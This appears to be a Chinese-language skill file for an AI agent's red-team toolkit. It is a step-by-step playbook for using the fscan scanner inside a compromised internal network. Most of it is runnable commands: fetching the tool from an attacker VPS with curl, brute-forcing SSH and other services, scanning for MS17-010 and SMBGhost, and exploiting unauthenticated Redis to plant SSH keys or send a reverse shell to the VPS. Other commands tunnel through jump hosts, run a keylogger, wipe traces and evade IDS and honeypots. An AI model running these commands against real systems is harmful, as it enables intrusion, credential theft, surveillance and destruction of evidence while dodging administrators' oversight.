---
name: fscan-intranet
description: fscan v2.2.1 内网综合扫描：存活探测、端口/服务识别、28 类弱口令爆破、未授权访问与高危漏洞（MS17-010/SMBGhost）、Redis 利用与 SOCKS5 隧道
whenToUse: 进入内网（跳板机/WebShell/socks5 隧道）后快速铺开资产面、找弱口令与未授权、把可达性变成可打点
role: internal
enabled: true
---

# fscan（内网综合扫描与弱口令/漏洞）

`fscan` = **广度优先的内网普查**：一段 C 段丢进去，几分钟内给出存活主机、开放端口、服务指纹、Web 标题、
弱口令、未授权访问、高危漏洞。**噪声大**，只适合内网（对互联网目标用外部扫描技能）。

## 与 gogo 的分工

| | fscan | gogo |
| --- | --- | --- |
| 定位 | 综合普查 + 爆破 + 利用 | 高性能测绘 + 指纹 + 信息提取 |
| 噪声 | 大（默认 600 线程 + 爆破 + POC） | 可控（`--opsec`、线程/超时自调） |
| 先用哪个 | 目标明确、要快速找弱口令与洞 | 大网段先铺面、要指纹和 title |

**推荐顺序**：先 `gogo` 铺面拿资产清单 → 再 `fscan` 对确认存活的目标做定向爆破与漏洞。

## 二进制

```
本机 : $DSH_HOME/redteam/toolkit/fscan/fscan          （v2.2.1，含本地插件）
       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-reverse-shell 的载荷目录）
```

**传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：

```bash
# 跳板机上直接下载（VPS 起载荷服务：~/.dsh/redteam/toolkit/vps/vps.sh serve 9100）
curl -o fscan http://<你的VPS_IP>:9100/fscan && chmod +x fscan
# 或从本机经 shells 上传
```

## 纪律（先看这条）

1. **范围**：只用授权清单内的网段；用 `-eh/-ehf` 显式排除办公网、打印机、工控、云元数据（169.254.169.254）。
2. **别打崩设备**：默认 `-t 600` 对老设备/工控很危险。内网先用 `-t 100 -time 3`，确认设备扛得住再加。
3. **先无爆破再爆破**：第一轮 `-nobr -nopoc` 只做资产面；确认目标重要性和授权后，第二轮再放开。
4. **避开蜜罐/IDS**：`-rate` 限速、`-maxpkts` 限量；管理员可能在看着。
5. **DNSLog 外带**：`-dns -domain <你的dnslog域名>`，别用公共 DNSLog 传敏感数据。

## 标准作业流程（SOP）

```bash
# 0) 确认自己在哪、能到哪
ip a; ip route

# 1) 存活普查（最快，先圈定活人）
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) 资产面（不爆破、不打 POC，最安静）
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web 优先：把 assets.txt 里的 web 端口交给截图/指纹环节
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) 定向爆破（授权确认后）
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) 高危漏洞与未授权
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## 参数速查（实测 v2.2.1 `-help`）

**目标**
```
-h  <IP|CIDR|文件|域名>   目标（IP 段文件也吃）
-hf <file>                主机文件        -eh/-ehf  排除主机/排除文件
-u  <URL>  -uf <file>     单 URL / URL 文件     -domain <域名>
```

**端口与存活**
```
-p  21,22,80,443,3306,6379,10000-10100    端口（默认内置约 150 个常用端口）
-pf <file>  端口文件        -ep 排除端口
-np         禁用 ping 探测（只扫端口，快）      -ao  仅存活探测
-nsp        禁用网段预筛（大网段提速）          -ntp 禁用 TCP 补充探测
```

**模式**
```
-m all        默认全流程（含爆破+POC）
-m icmp       仅存活
-m <插件>     只跑指定服务插件，例如 -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         禁爆破   -nopoc 禁 POC   -noredis 禁 Redis 利用
```

**并发与节流**（OPSEC 关键）
```
-t 600       端口扫描线程        -time 3   端口超时(秒)
-mt 20       模块线程            -wt 5     Web 超时
-gt 0        全局超时(秒)        -retry 3  重试次数
-rate 0      每分钟最大发包数(0=不限)   -maxpkts 0  总发包上限
-num 20      POC 并发            -icmp-rate 0.1  ICMP 速率
```

**凭据（爆破）**
```
-user/-pwd      单组账号密码          -userf/-pwdf  字典文件
-upf            用户名:密码 对文件     -usera/-pwda  追加多个（逗号/空格分隔）
-hash/-hashf    NTLM Hash 碰撞        -sshkey       私钥登录
```

**利用（拿到就用，注意授权边界）**
```
-rf <pubkey>        Redis 写公钥（写 authorized_keys 拿 SSH）
-rs                Redis Shell        -rwc/-rwf/-rwp  Redis 写入内容/文件/路径
-rsh <ip:port>     反弹 Shell 到指定地址（配合技能 vps-reverse-shell）
-sc <shellcode>    MS17-010 ShellCode
-local <plugin>    本机插件：systeminfo / keylogger / cleaner 等（在跳板机上跑）
-start-socks5 1080 在跳板机上开 SOCKS5 服务，把内网暴露给本机
-fsh-port 4444     正向 Shell 服务端口
```

**代理（打隧道后的核心用法）**
```
-socks5 127.0.0.1:1080                 走 SOCKS5（suo5 / ssh -D / frp 都行）
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           走 HTTP 代理
```

**输出**
```
-o result.txt    输出文件        -f txt|json|csv   格式
-no              不保存结果      -silent  静默     -nocolor/-nopg  关颜色/进度条
-lang zh|en      语言            -log "base,info,success"   日志级别
-dns             记录 DNS 日志（配合 -domain 做外带检测）
-perf            输出性能统计 JSON
```

## 关键场景

### 1. 通过隧道打内网（最常用）

```bash
# 前提：已有 socks5（技能 suo5-tunnel，或 vps-reverse-shell 里 ssh -D）
# 实测验证过：fscan -socks5 会把流量真正送进隧道
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

注意：走代理时线程别开太大（隧道本身是瓶颈），`-t 50` 左右足够。

### 2. 在跳板机上开隧道给本机用

跳板机上执行（把内网 10 段暴露到 VPS 的 9100 端口，再 ssh 本地转发回来）：

```bash
./fscan -start-socks5 1080      # 跳板机:1080 变成 SOCKS5
# VPS 上反向隧道：ssh -R 9200:127.0.0.1:1080 ubuntu@<你的VPS_IP>
# 本机：ssh -L 1080:127.0.0.1:9200 ubuntu@<你的VPS_IP>
# 之后所有工具都能 -socks5 127.0.0.1:1080
```

### 3. 拿 Redis 直接要权限

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 → ssh 上去
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
./fscan -h 10.0.0.5 -p 6379 -rsh <你的VPS_IP>:9000              # 反弹到 VPS 监听
```

### 4. 落到服务器上之后

```bash
./fscan -local systeminfo        # 系统信息、环境变量、域控、网卡
./fscan -local keylogger         # 键盘记录（-keylog-output 指定输出）
./fscan -local cleaner           # 痕迹清理
```

## 结果落库（必须做）

fscan 的 txt 输出是分段的，解析后逐条入库：

```bash
# 每台存活主机
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# 每个开放端口/服务
redteam_asset_add  { engagement, ip, port, service, banner }   # 或 asset_link 关联
# 爆破/未授权成功的凭据与访问
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<段>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# 确认的漏洞（必须配 http_evidence 或等价证据）
redteam_vuln_add   { engagement, target, name: "Redis 未授权访问", severity: "high", evidence_ref }
```

**纪律**：`-o` 的输出文件是证据，拷回 `runs/`；不要只在终端里看一眼就算数。

## 排障

| 现象 | 处理 |
| --- | --- |
| 扫不动/极慢 | 去掉 `-np`、降 `-t`、加 `-time`；大网段先 `-m icmp` 圈活人 |
| 全是假开放 | 中间有防火墙/负载均衡回 SYN-ACK，用 `-time` 调大 + `-retry` 复核 |
| ICMP 失败 | 需要 root/`CAP_NET_RAW`；用 `sudo ./fscan -m icmp`，或改用 `-np` 只扫端口 |
| 爆破被锁 | 先用 `-usera` 少量试，确认无锁定策略（域账号尤其危险） |
| 中文乱码 | `-lang en` 或 `export LANG=zh_CN.UTF-8` |
| 想更安静 | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`，必要时 `-silent` |

## 相关技能

- `gogo-intranet`：先用它铺面
- `suo5-tunnel`：WebShell → SOCKS5，给 fscan 提供 `-socks5` 入口
- `vps-reverse-shell`：`-rsh` 的落地端、载荷投递
- `webshell-toolkit`：拿到 WebShell 后的管理
